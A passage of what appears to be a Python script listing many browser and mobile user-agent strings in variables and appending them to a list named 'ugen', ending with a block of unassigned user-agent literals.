akx46="Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 5A MIUI/V10.3.2.0.OCKMIXM)"
akx47="Mozilla/5.0 (Linux; Android 6.0; SMART Surf2 4G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
akx48="Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-J111F Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.2 Chrome/67.0.3396.87 Mobile Safari/537.36"
akx49="Mozilla/5.0 (iPad; CPU OS 10_3_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/71.0.3578.89 Mobile/14E304 Safari/602.1"
akx50="Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36"
akx51="Mozilla/5.0 (Linux; Android 4.1.2; C1905 Build/15.1.C.2.8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36"
akx52="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; IEeleven; rv:11.0) like Gecko"
akx53="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36 OPR/62.0.3331.18"
akx54="Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36 GSA/10.28.9.21.arm64"
akx55="Mozilla/5.0 (Linux; Android 8.0.0; SM-G570F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36"
akx56="Mozilla/5.0 (Linux; Android 8.1.0; SM-J530F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36"
akx57="AndroidDownloadManager/8.1.0 (Linux; U; Android 8.1.0; meizu X8 Build/OPM1.171019.026)"
akx58="Mozilla/5.0 (Linux; Android 9; POT-LX1 Build/HUAWEIPOT-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36"
akx59="Mozilla/5.0 (Linux; Android 9; LYA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"
akx60="Mozilla/5.0 (Linux; Android 7.1.1; VFD 710) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36"
akx61="Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.143 Mobile Safari/537.36"
akx62="Mozilla/5.0 (Linux; Android 5.1.1; SM-J320M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
akx63="AndroidDownloadManager/9 (Linux; U; Android 9; SM-A705FN Build/PPR1.180610.011)"
akx64="Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J415F Build/M1AJQ)"
akx65="Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG-SM-G935A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36"
akx66="Mozilla/5.0 (Linux; Android 7.1.1; SM-J510FN Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/75.0.3770.101 Mobile Safari/537.36 GSA/10.20.3.21.arm"
akx67="AndroidDownloadManager/9 (Linux; U; Android 9; VTR-L09 Build/HUAWEIVTR-L09)"
akx68="Dalvik/2.1.0 (Linux; U; Android 9; VTR-L09 Build/HUAWEIVTR-L09)"
cxk=(akx,akx0,akx1,akx2,akx3,akx4,akx5,akx6,akx7,akx8,akx9,akx10,akx11,akx12,akx13,akx14,akx15,akx16,akx17,akx18,akx19,akx20,akx21,akx22,akx23,akx24,akx25,akx26,akx27,akx28,akx29,akx30,akx31,akx32,akx33,akx34,akx35,akx36,akx37,akx38,akx39,akx40,akx41,akx42,akx43,akx44,akx45,akx46,akx47,akx48,akx49,akx50,akx51,akx52,akx53,akx54,akx55,akx56,akx57,akx58,akx59,akx60,akx61,akx62,akx63,akx64,akx65,akx66,akx67,akx68)
ugen.append(cxk)
#_______________##____________#
a="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
b="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko"
c="Mozilla/5.0 (Linux; U; Android 4.4.2; id; SM-G900 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/534.30"
d="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko"
e="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko"
f="Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.517"
g="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
h="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
i="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
j="Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36"
k="Mozilla/5.0 (Linux; Android 6.0.1; SM-G928F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/109.0.0.15.71;]"
l="Mozilla/5.0 (Linux; Android 5.0.2; SM-G530FZ Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
m="Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
n="Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
o="Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0"
p="Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0"
q="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0"
r="Mozilla/5.0 (compatible; PaperLiBot/2.1; http://support.paper.li/entries/20023257-what-is-paper-li)"
s="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7"
t="Mozilla/5.0 (X11; CrOS x86_64 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36"
u="Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0"
v="Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1"
w="Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
x="Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
y="Mozilla/5.0 (X11; CrOS armv7l 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36"
z="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
aa="Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
bb="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"
cc="Mozilla/5.0 (Linux; Android 5.0.2; SM-T530 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36"
dd="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.50"
ee="Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0E; InfoPath.1)"
ff="Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
gg="Mozilla/5.0 (compatible; ecoresearch/0.9; +http://www.ecoresearch.net)"
hh="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
ii="Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0"
jj="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
kk="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
ll="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
mm="Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/FBIOS;FBAV/78.0.0.40.70;FBBV/48784289;FBRV/0;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBCR/OrangeFrance;FBID/phone;FBLC/fr_FR;FBOP/5]"
nn="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0"
oo="Mozilla/5.0 (X11; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0"
pp="Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
qq="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0"
rr="Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 Iceweasel/3.0.3 (Debian-3.0.3-3)"
ss="Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0"
tt="Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0"
uu="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
vv="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"
sd=(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv)
ugen.append(sd) 
#_______________##____________# 
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36"
"Mozilla/5.0 (iPod; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPad; CPU OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (X11; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (Android 15; Mobile; LG-M255; rv:130.0) Gecko/130.0 Firefox/130.0"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"
"Mozilla/5.0 (iPod touch; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) FxiOS/130.0 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (Android 15; Mobile; rv:130.0) Gecko/130.0 Firefox/130.0"
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/130.0 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (iPad; CPU OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/130.0 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0"
"Mozilla/5.0 (iPod; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
"Mozilla/5.0 (iPad; CPU OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPod touch; CPU iPhone 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPad; CPU OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15"
"Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (Windows NT 6.2; Trident/7.0; rv:11.0) like Gecko"
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)"
"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)"
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)"
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edge/44.18363.8131"
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 EdgiOS/128.2739.72 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (Windows Mobile 10; Android 10.0; Microsoft; Lumia 950XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36 Edge/40.15254.603"
"Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Linux; Android 10; HD1913) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36 EdgA/128.0.2739.82"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.2739.79"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.2739.79"
"Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36 OPR/76.2.4027.73374"
"Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36 OPR/76.2.4027.73374"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/113.0.0.0"
"Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36 OPR/76.2.4027.73374"
"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/113.0.0.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/113.0.0.0"
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Vivaldi/6.9.3447.44"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/113.0.0.0"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Vivaldi/6.9.3447.44"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Vivaldi/6.9.3447.44"
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Vivaldi/6.9.3447.44"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Vivaldi/6.9.3447.44"
"Mozilla/5.0 (iPod touch; CPU iPhone 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 YaBrowser/24.7.7.783 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (Linux; arm_64; Android 15; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 YaBrowser/24.7.6.41 Mobile Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 YaBrowser/24.7.7.783 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPad; CPU OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 YaBrowser/24.7.7.783 Mobile/15E148 Safari/605.1"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 YaBrowser/24.7.1.1144 Yowser/2.5 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 YaBrowser/24.7.1.1144 Yowser/2.5 Safari/537.36"
"Mozilla/5.0 (X11; CrOS armv7l 15917.71.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.132 Safari/537.36"
"Mozilla/5.0 (X11; CrOS aarch64 15917.71.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.132 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.2739.79"
"Mozilla/5.0 (X11; CrOS x86_64 15917.71.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.132 Safari/537.36"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.2739.79"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/129.0.6668.46 Mobile/15E148 Safari/604.1"
"Mozilla/5.0 (iPhone; CPU iPhone OS 17_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/130.0 Mobile/15E148 Safari/605.1.15"
"Mozilla/5.0 (Android 15; Mobile; LG-M255; rv:130.0) Gecko/130.0 Firefox/130.0"
"Mozilla/5.0 (Android 15; Mobile; rv:68.0) Gecko/68.0 Firefox/130.0"
"Mozilla/5.0 (Linux; Android 15; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 15; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.127 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36"
"Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5511.63 Safari/537.36"
"Mozilla/5.0 (Linux; Android 9; CPH1923 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36"
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Safari/537.36"
"Mozilla/5.0 (Linux; Android 13; M2101K7BG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; SM-A032F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.76 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 8.1.0; Infinix X650 Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.162 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Hola/1.214.96"
"Mozilla/5.0 (Linux; Android 12; 21061119AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Trailer/90.3.3212.13"
"Mozilla/5.0 (Linux; Android 13; SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1803) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1803) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 12; 2201117TG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 13; SM-E135F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Linux; Android 11; Infinix X688B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36/8mqQhSuL-09"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36/8mqAoGuL-19"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36/8mqTxTuL-47"
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.55"
"Mozilla/5.0 (Linux; Android 12; Redmi Note 9S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.163 Mobile Safari/537.36"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36/8mqNJauL-25"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 AVG/113.0.21244.128"
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.126 Safari/537.36 (compatible; Google-Safety; +http://www.google.com/bot.html)"
